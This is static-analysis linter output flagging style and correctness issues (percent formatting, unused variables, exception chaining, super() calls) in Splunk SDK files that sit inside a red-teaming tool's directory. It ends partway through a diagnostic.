548 |                 token = self.token
549 |             else:
550 |                 token = "Splunk %s" % self.token
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^
551 |             return [("Authorization", token)]
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:917:26
    |
915 |             body = response.body.read()
916 |             session = XML(body).findtext("./sessionKey")
917 |             self.token = "Splunk %s" % session
    |                          ^^^^^^^^^^^^^^^^^^^^^
918 |             return self
919 |         except HTTPError as he:
    |
help: Replace with format specifiers

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:921:17
    |
919 |         except HTTPError as he:
920 |             if he.status == 401:
921 |                 raise AuthenticationError("Login failed.", he)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
922 |             else:
923 |                 raise
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:983:31
    |
981 |         # '-' for the other.
982 |         if ns.app is None and ns.owner is None:
983 |             return UrlEncoded("/services/%s" % path_segment, skip_encode=skip_encode)
    |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
984 |
985 |         oname = "nobody" if ns.owner is None else ns.owner
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:988:13
    |
986 |         aname = "system" if ns.app is None else ns.app
987 |         path = UrlEncoded(
988 |             "/servicesNS/%s/%s/%s" % (oname, aname, path_segment),
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
989 |             skip_encode=skip_encode,
990 |         )
    |
help: Replace with format specifiers

F841 [*] Local variable `err` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:1054:30
     |
1052 |         try:
1053 |             detail = XML(body).findtext("./messages/msg")
1054 |         except ParseError as err:
     |                              ^^^
1055 |             detail = body
1056 |         message = "HTTP %d %s%s" % (
     |
help: Remove assignment to unused variable `err`

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:1056:19
     |
1054 |         except ParseError as err:
1055 |             detail = body
1056 |         message = "HTTP %d %s%s" % (
     |                   ^^^^^^^^^^^^^^
1057 |             status,
1058 |             reason,
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:1059:39
     |
1057 |             status,
1058 |             reason,
1059 |             "" if detail is None else " -- %s" % detail,
     |                                       ^^^^^^^^^^^^^^^^^
1060 |         )
1061 |         Exception.__init__(self, _message or message)
     |
help: Replace with format specifiers

UP004 [*] Class `HttpLib` inherits from `object`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:1141:15
     |
1139 | # Given an HTTP request handler, this wrapper objects provides a related
1140 | # family of convenience methods built using that handler.
1141 | class HttpLib(object):
     |               ^^^^^^
1142 |     """A set of convenient methods for making HTTP calls.
     |
help: Remove `object` inheritance

SIM300 [*] Yoda condition detected
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:1306:12
     |
1304 |         response = self.handler(url, message, **kwargs)
1305 |         response = record(response)
1306 |         if 400 <= response.status:
     |            ^^^^^^^^^^^^^^^^^^^^^^
1307 |             raise HTTPError(response)
     |
help: Rewrite as `response.status >= 400`

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\binding.py:1432:26
     |
1430 |                 kwargs["context"] = ssl._create_unverified_context()
1431 |             return six.moves.http_client.HTTPSConnection(host, port, **kwargs)
1432 |         raise ValueError("unsupported scheme: %s" % scheme)
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1433 |
1434 |     def request(url, message, **kwargs):
     |
help: Replace with format specifiers

F811 Redefinition of unused `datetime` from line 62
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:62:8
   |
61 | import contextlib
62 | import datetime
   |        -------- previous definition of `datetime` here
63 | import json
64 | import logging
65 | import socket
66 | from datetime import datetime, timedelta
   |                      ^^^^^^^^ `datetime` redefined here
67 | from time import sleep
   |
help: Remove definition: `datetime`

F401 [*] `.binding.AuthenticationError` imported but unused
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:74:5
   |
72 | from . import data
73 | from .binding import (
74 |     AuthenticationError,
   |     ^^^^^^^^^^^^^^^^^^^
75 |     Context,
76 |     HTTPError,
   |
help: Remove unused import: `.binding.AuthenticationError`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:122:23
    |
120 | XNAME_CONTENT = XNAMEF_ATOM % "content"
121 |
122 | MATCH_ENTRY_CONTENT = "%s/%s/*" % (XNAME_ENTRY, XNAME_CONTENT)
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Replace with format specifiers

N818 Exception name `IllegalOperationException` should be named with an Error suffix
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:125:7
    |
125 | class IllegalOperationException(Exception):
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^
126 |     """Thrown when an operation is not possible on the Splunk instance that a
127 |     :class:`Service` object is connected to."""
    |

N818 Exception name `IncomparableException` should be named with an Error suffix
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:132:7
    |
132 | class IncomparableException(Exception):
    |       ^^^^^^^^^^^^^^^^^^^^^
133 |     """Thrown when trying to compare objects (using ``==``, ``<``, ``>``, and
134 |     so on) of a type that doesn't support it."""
    |

N818 Exception name `AmbiguousReferenceException` should be named with an Error suffix
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:139:7
    |
139 | class AmbiguousReferenceException(ValueError):
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
140 |     """Thrown when the name used to fetch an entity matches more than one entity."""
    |

N818 Exception name `InvalidNameException` should be named with an Error suffix
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:145:7
    |
145 | class InvalidNameException(Exception):
    |       ^^^^^^^^^^^^^^^^^^^^
146 |     """Thrown when the specified name contains characters that are not allowed
147 |     in Splunk entity names."""
    |

N818 Exception name `NoSuchCapability` should be named with an Error suffix
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:152:7
    |
152 | class NoSuchCapability(Exception):
    |       ^^^^^^^^^^^^^^^^
153 |     """Thrown when the capability that has been referred to doesn't exist."""
    |

UP008 [*] Use `super()` instead of `super(__class__, self)`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:432:14
    |
431 |     def __init__(self, **kwargs):
432 |         super(Service, self).__init__(**kwargs)
    |              ^^^^^^^^^^^^^^^
433 |         self._splunk_version = None
    |
help: Remove `super()` parameters

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:618:33
    |
616 |                 if not self.restart_required:
617 |                     return result
618 |             except Exception as e:
    |                                 ^
619 |                 sleep(1)
620 |         raise Exception("Operation time out.")
    |
help: Remove assignment to unused variable `e`

UP004 [*] Class `Endpoint` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:731:16
    |
731 | class Endpoint(object):
    |                ^^^^^^
732 |     """This class represents individual Splunk resources in the Splunk REST API.
    |
help: Remove `object` inheritance

SIM910 [*] Use `kwargs.get("state")` instead of `kwargs.get("state", None)`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:941:26
    |
939 |         self._state = None
940 |         if not kwargs.get("skip_refresh", False):
941 |             self.refresh(kwargs.get("state", None))  # "Prefresh"
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^
942 |         return
    |
help: Replace `kwargs.get("state", None)` with `kwargs.get("state")`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:973:13
    |
971 |         """
972 |         raise IncomparableException(
973 |             "Equality is undefined for objects of class %s" % self.__class__.__name__
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
974 |         )
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:998:17
     |
 996 |         if isinstance(elem, list):
 997 |             raise AmbiguousReferenceException(
 998 |                 "Fetch from server returned multiple entries for name %s." % self.name
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 999 |             )
1000 |         else:
     |
help: Replace with format specifiers

UP008 [*] Use `super()` instead of `super(__class__, self)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1056:21
     |
1054 |     def get(self, path_segment="", owner=None, app=None, sharing=None, **query):
1055 |         owner, app, sharing = self._proper_namespace(owner, app, sharing)
1056 |         return super(Entity, self).get(
     |                     ^^^^^^^^^^^^^^
1057 |             path_segment, owner=owner, app=app, sharing=sharing, **query
1058 |         )
     |
help: Remove `super()` parameters

UP008 [*] Use `super()` instead of `super(__class__, self)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1062:21
     |
1060 |     def post(self, path_segment="", owner=None, app=None, sharing=None, **query):
1061 |         owner, app, sharing = self._proper_namespace(owner, app, sharing)
1062 |         return super(Entity, self).post(
     |                     ^^^^^^^^^^^^^^
1063 |             path_segment, owner=owner, app=app, sharing=sharing, **query
1064 |         )
     |
help: Remove `super()` parameters

C404 Unnecessary list comprehension (rewrite as a dict comprehension)
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1154:26
     |
1152 |           # text to be dispatched via HTTP. However, these links are already
1153 |           # URL encoded when they arrive, and we need to mark them as such.
1154 |           unquoted_links = dict(
     |  __________________________^
1155 | |             [
1156 | |                 (k, UrlEncoded(v, skip_encode=True))
1157 | |                 for k, v in six.iteritems(results["links"])
1158 | |             ]
1159 | |         )
     | |_________^
1160 |           results["links"] = unquoted_links
1161 |           return results
     |
help: Rewrite as a dict comprehension

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1303:21
     |
1301 |               if len(entries) > 1:
1302 |                   raise AmbiguousReferenceException(
1303 | /                     "Found multiple entities named '%s'; please specify a namespace."
1304 | |                     % key
     | |_________________________^
1305 |                   )
1306 |               elif len(entries) == 0:
     |
help: Replace with format specifiers

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1312:17
     |
1310 |         except HTTPError as he:
1311 |             if he.status == 404:  # No entity matching key and namespace.
1312 |                 raise KeyError(key)
     |                 ^^^^^^^^^^^^^^^^^^^
1313 |             else:
1314 |                 raise
     |

UP028 Replace `yield` over `for` loop with `yield from`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1337:9
     |
1335 |           """
1336 |
1337 | /         for item in self.iter(**kwargs):
1338 | |             yield item
     | |______________________^
1339 |
1340 |       def __len__(self):
     |
help: Replace with `yield from`

N806 Variable `N` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1500:13
     |
1498 |             response = self.get(count=pagesize or count, offset=offset, **kwargs)
1499 |             items = self._load_list(response)
1500 |             N = len(items)
     |             ^
1501 |             fetched += N
1502 |             for item in items:
     |

UP028 Replace `yield` over `for` loop with `yield from`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1502:13
     |
1500 |               N = len(items)
1501 |               fetched += N
1502 | /             for item in items:
1503 | |                 yield item
     | |__________________________^
1504 |               if pagesize is None or N < pagesize:
1505 |                   break
     |
help: Replace with `yield from`

SIM300 [*] Yoda condition detected
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1504:36
     |
1502 |             for item in items:
1503 |                 yield item
1504 |             if pagesize is None or N < pagesize:
     |                                    ^^^^^^^^^^^^
1505 |                 break
1506 |             offset += N
     |
help: Rewrite as `pagesize > N`

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1623:40
     |
1621 |         """
1622 |         if not isinstance(name, six.string_types):
1623 |             raise InvalidNameException("%s is not a valid name for an entity." % name)
     |                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1624 |         if "namespace" in params:
1625 |             namespace = params.pop("namespace")
     |
help: Replace with format specifiers

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1679:17
     |
1677 |             # KeyError.
1678 |             if he.status == 404:
1679 |                 raise KeyError("No such entity %s" % name)
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1680 |             else:
1681 |                 raise
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1679:32
     |
1677 |             # KeyError.
1678 |             if he.status == 404:
1679 |                 raise KeyError("No such entity %s" % name)
     |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^
1680 |             else:
1681 |                 raise
     |
help: Replace with format specifiers

UP008 [*] Use `super()` instead of `super(__class__, self)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1730:21
     |
1728 |         """
1729 |         name = UrlEncoded(name, encode_slash=True)
1730 |         return super(Collection, self).get(name, owner, app, sharing, **query)
     |                     ^^^^^^^^^^^^^^^^^^
     |
help: Remove `super()` parameters

F841 Local variable `response` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1767:13
     |
1765 |         # that multiple entities means a name collision, so we have to override it here.
1766 |         try:
1767 |             response = self.get(key)
     |             ^^^^^^^^
1768 |             return ConfigurationFile(
1769 |                 self.service, PATH_CONF % key, state={"title": key}
     |
help: Remove assignment to unused variable `response`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1773:17
     |
1771 |         except HTTPError as he:
1772 |             if he.status == 404:  # No entity matching key
1773 |                 raise KeyError(key)
     |                 ^^^^^^^^^^^^^^^^^^^
1774 |             else:
1775 |                 raise
     |

F841 Local variable `response` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1781:13
     |
1779 |         # in order to find out if a configuration exists.
1780 |         try:
1781 |             response = self.get(key)
     |             ^^^^^^^^
1782 |             return True
1783 |         except HTTPError as he:
     |
help: Remove assignment to unused variable `response`

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1804:30
     |
1802 |         # Entity.
1803 |         if not isinstance(name, six.string_types):
1804 |             raise ValueError("Invalid name: %s" % repr(name))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1805 |         response = self.post(__conf=name)
1806 |         if response.status == 303:
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1814:17
     |
1812 |           else:
1813 |               raise ValueError(
1814 | /                 "Unexpected status code %s returned from creating a stanza"
1815 | |                 % response.status
     | |_________________________________^
1816 |               )
     |
help: Replace with format specifiers

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1853:21
     |
1851 |             [
1852 |                 x
1853 |                 for x in self._state.content.keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1854 |                 if not x.startswith("eai") and x != "disabled"
1855 |             ]
     |
help: Remove `.keys()`

SIM910 [*] Use `kwargs.get("state")` instead of `kwargs.get("state", None)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1863:17
     |
1862 |     def __init__(self, service, path, **kwargs):
1863 |         state = kwargs.get("state", None)
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^
1864 |         kwargs["skip_refresh"] = kwargs.get("skip_refresh", state is not None)
1865 |         super(StoragePassword, self).__init__(service, path, **kwargs)
     |
help: Replace `kwargs.get("state", None)` with `kwargs.get("state")`

UP008 [*] Use `super()` instead of `super(__class__, self)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1865:14
     |
1863 |         state = kwargs.get("state", None)
1864 |         kwargs["skip_refresh"] = kwargs.get("skip_refresh", state is not None)
1865 |         super(StoragePassword, self).__init__(service, path, **kwargs)
     |              ^^^^^^^^^^^^^^^^^^^^^^^
1866 |         self._state = state
     |
help: Remove `super()` parameters

UP008 [*] Use `super()` instead of `super(__class__, self)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1893:14
     |
1891 |         if service.namespace.owner == "-" or service.namespace.app == "-":
1892 |             raise ValueError("StoragePasswords cannot have wildcards in namespace.")
1893 |         super(StoragePasswords, self).__init__(
     |              ^^^^^^^^^^^^^^^^^^^^^^^^
1894 |             service, PATH_STORAGE_PASSWORDS, item=StoragePassword
1895 |         )
     |
help: Remove `super()` parameters

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1913:30
     |
1911 |         """
1912 |         if not isinstance(username, six.string_types):
1913 |             raise ValueError("Invalid name: %s" % repr(username))
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1914 |
1915 |         if realm is None:
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1922:17
     |
1920 |           if response.status != 201:
1921 |               raise ValueError(
1922 | /                 "Unexpected status code %s returned from creating a stanza"
1923 | |                 % response.status
     | |_________________________________^
1924 |               )
     |
help: Replace with format specifiers

F632 [*] Use `!=` to compare constant literals
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:1962:12
     |
1961 |         # Append the : expected at the end of the name
1962 |         if name[-1] is not ":":
     |            ^^^^^^^^^^^^^^^^^^^
1963 |             name = name + ":"
1964 |         return Collection.delete(self, name)
     |
help: Replace `is not` with `!=`

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2065:37
     |
2063 |           # If we have cookie(s), use them instead of "Authorization: ..."
2064 |           if self.service.has_cookies():
2065 |               cookie_or_auth_header = "Cookie: %s\r\n" % _make_cookie_header(
     |  _____________________________________^
2066 | |                 self.service.get_cookies().items()
2067 | |             )
     | |_____________^
2068 |
2069 |           # Since we need to stream to the index connection, we have to keep
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2074:14
     |
2072 |         sock = self.service.connect()
2073 |         headers = [
2074 |             ("POST %s HTTP/1.1\r\n" % str(self.service._abspath(path))).encode("utf-8"),
     |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2075 |             ("Host: %s:%s\r\n" % (self.service.host, int(self.service.port))).encode(
2076 |                 "utf-8"
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2075:14
     |
2073 |         headers = [
2074 |             ("POST %s HTTP/1.1\r\n" % str(self.service._abspath(path))).encode("utf-8"),
2075 |             ("Host: %s:%s\r\n" % (self.service.host, int(self.service.port))).encode(
     |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2076 |                 "utf-8"
2077 |             ),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2156:21
     |
2154 |               if self.content.totalEventCount != "0":
2155 |                   raise OperationError(
2156 | /                     "Cleaning index %s took longer than %s seconds; timing out."
2157 | |                     % (self.name, timeout)
     | |__________________________________________^
2158 |                   )
2159 |           finally:
     |
help: Replace with format specifiers

UP008 [*] Use `super()` instead of `super(__class__, self)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2268:25
     |
2266 |         # field. For all other inputs kinds, we can dispatch to the superclass method.
2267 |         if self.kind not in ["tcp", "splunktcp", "tcp/raw", "tcp/cooked", "udp"]:
2268 |             return super(Input, self).update(**kwargs)
     |                         ^^^^^^^^^^^^^
2269 |         else:
2270 |             # The behavior of restrictToHost is inconsistent across input kinds and versions of Splunk.
     |
help: Remove `super()` parameters

UP008 [*] Use `super()` instead of `super(__class__, self)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2292:25
     |
2291 |             # Do the actual update operation.
2292 |             return super(Input, self).update(**to_update)
     |                         ^^^^^^^^^^^^^
     |
help: Remove `super()` parameters

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2320:25
     |
2318 |                 if len(entries) > 1:
2319 |                     raise AmbiguousReferenceException(
2320 |                         "Found multiple inputs of kind %s named %s." % (kind, key)
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2321 |                     )
2322 |                 elif len(entries) == 0:
     |
help: Replace with format specifiers

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2328:21
     |
2326 |             except HTTPError as he:
2327 |                 if he.status == 404:  # No entity matching kind and key
2328 |                     raise KeyError((key, kind))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2329 |                 else:
2330 |                     raise
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2342:29
     |
2340 |                     if len(entries) > 1:
2341 |                         raise AmbiguousReferenceException(
2342 |                             "Found multiple inputs of kind %s named %s." % (kind, key)
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2343 |                         )
2344 |                     elif len(entries) == 0:
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2351:33
     |
2349 |                           ):  # Already found at least one candidate
2350 |                               raise AmbiguousReferenceException(
2351 | /                                 "Found multiple inputs named %s, please specify a kind"
2352 | |                                 % key
     | |_____________________________________^
2353 |                               )
2354 |                           candidate = entries[0]
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2440:17
     |
2438 |             self.path + kindpath,
2439 |             (
2440 |                 "%s:%s" % (kwargs["restrictToHost"], name)
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2441 |                 if "restrictToHost" in kwargs
2442 |                 else name
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2514:29
     |
2512 |         :rtype: class:``splunklib.data.Record``
2513 |         """
2514 |         response = self.get("%s/_new" % self._kindmap[kind])
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2515 |         content = _load_atom(response, MATCH_ENTRY_CONTENT)
2516 |         return _parse_atom_metadata(content)
     |
help: Replace with format specifiers

SIM910 [*] Use `kwargs.get("sort_mode")` instead of `kwargs.get("sort_mode", None)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2698:12
     |
2696 |         if "count" in kwargs:
2697 |             entities = entities[: kwargs["count"]]
2698 |         if kwargs.get("sort_mode", None) == "alpha":
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2699 |             sort_field = kwargs.get("sort_field", "name")
2700 |             if sort_field == "name":
     |
help: Replace `kwargs.get("sort_mode", None)` with `kwargs.get("sort_mode")`

E731 Do not assign a `lambda` expression, use a `def`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2701:17
     |
2699 |             sort_field = kwargs.get("sort_field", "name")
2700 |             if sort_field == "name":
2701 |                 f = lambda x: x.name.lower()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2702 |             else:
2703 |                 f = lambda x: x[sort_field].lower()
     |
help: Rewrite `f` as a `def`

E731 Do not assign a `lambda` expression, use a `def`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2703:17
     |
2701 |                 f = lambda x: x.name.lower()
2702 |             else:
2703 |                 f = lambda x: x[sort_field].lower()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2704 |             entities = sorted(entities, key=f)
2705 |         if kwargs.get("sort_mode", None) == "alpha_case":
     |
help: Rewrite `f` as a `def`

SIM910 [*] Use `kwargs.get("sort_mode")` instead of `kwargs.get("sort_mode", None)`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2705:12
     |
2703 |                 f = lambda x: x[sort_field].lower()
2704 |             entities = sorted(entities, key=f)
2705 |         if kwargs.get("sort_mode", None) == "alpha_case":
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2706 |             sort_field = kwargs.get("sort_field", "name")
2707 |             if sort_field == "name":
     |
help: Replace `kwargs.get("sort_mode", None)` with `kwargs.get("sort_mode")`

SIM108 Use ternary operator `f = (lambda x: x.name) if sort_field == "name" else lambda x: x[sort_field]` instead of `if`-`else`-block
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2707:13
     |
2705 |           if kwargs.get("sort_mode", None) == "alpha_case":
2706 |               sort_field = kwargs.get("sort_field", "name")
2707 | /             if sort_field == "name":
2708 | |                 f = lambda x: x.name
2709 | |             else:
2710 | |                 f = lambda x: x[sort_field]
     | |___________________________________________^
2711 |               entities = sorted(entities, key=f)
2712 |           if kwargs.get("sort_dir", "asc") == "desc":
     |
help: Replace `if`-`else`-block with `f = (lambda x: x.name) if sort_field == "name" else lambda x: x[sort_field]`

E731 Do not assign a `lambda` expression, use a `def`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2708:17
     |
2706 |             sort_field = kwargs.get("sort_field", "name")
2707 |             if sort_field == "name":
2708 |                 f = lambda x: x.name
     |                 ^^^^^^^^^^^^^^^^^^^^
2709 |             else:
2710 |                 f = lambda x: x[sort_field]
     |
help: Rewrite `f` as a `def`

E731 Do not assign a `lambda` expression, use a `def`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2710:17
     |
2708 |                 f = lambda x: x.name
2709 |             else:
2710 |                 f = lambda x: x[sort_field]
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2711 |             entities = sorted(entities, key=f)
2712 |         if kwargs.get("sort_dir", "asc") == "desc":
     |
help: Rewrite `f` as a `def`

UP028 Replace `yield` over `for` loop with `yield from`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2717:9
     |
2716 |       def __iter__(self, **kwargs):
2717 | /         for item in self.iter(**kwargs):
2718 | |             yield item
     | |______________________^
2719 |
2720 |       def iter(self, **kwargs):
     |
help: Replace with `yield from`

UP028 Replace `yield` over `for` loop with `yield from`
    --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\client.py:2741:9
     |
2739 |           :type kwargs: ``dict``
2740 |           """
2741 | /         for item in self.list(**kwargs):
2742 | |             yield item
     | |______________________^
2743 |
2744 |       def oneshot(self, path, **kwargs):
     |
help: Replace with `yield from`

SIM910 [*] Use `kwargs.get("exec_mode")` instead of `kwargs.get("exec_mode", None)`
